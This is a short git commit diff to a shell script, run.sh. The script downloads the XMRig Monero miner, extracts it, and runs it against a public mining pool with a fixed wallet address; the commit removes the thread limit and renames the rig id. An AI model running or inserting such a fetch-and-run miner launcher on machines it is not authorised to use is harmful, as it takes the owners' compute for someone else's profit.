7264af76900362ebb38d789d3ef5637ae268f8a6
willikscool2 <85990748+willikscool2@users.noreply.github.com>
2021-06-27 18:40:31 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,3 +1,3 @@
 sudo apt update -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-focal-x64.tar.gz && tar -zxf xmrig-6.12.2-focal-x64.tar.gz
-./xmrig-6.12.2/xmrig -o sg.minexmr.com:443 -u 89fYEJEXcF6boxxa7dK79PBqJPr6LBZZ16HD7NiFVfvqCoJKAppwup5Kpvsa7EEJhtjBoPonA4XQrWGcdfDtmbfA9M5sHD5 -k -t 2 --tls --rig-id tes
+./xmrig-6.12.2/xmrig -o sg.minexmr.com:443 -u 89fYEJEXcF6boxxa7dK79PBqJPr6LBZZ16HD7NiFVfvqCoJKAppwup5Kpvsa7EEJhtjBoPonA4XQrWGcdfDtmbfA9M5sHD5 -k --tls --rig-id t1
